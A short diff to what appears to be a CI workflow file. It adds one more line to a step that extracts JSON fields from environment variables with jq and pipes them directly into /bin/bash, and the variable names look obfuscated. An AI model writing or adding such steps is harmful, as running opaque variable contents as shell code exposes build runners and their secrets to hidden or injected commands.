@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$tqr7734" | jq -r .flzpf4160 | /bin/bash
           echo $zmp1 | jq -r .fqpc2 | /bin/bash
           printf '%s' "$nu40568" | jq -r .rnuc7130 | /bin/bash
+          printf '%s' "$jwzc677" | jq -r .q0 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
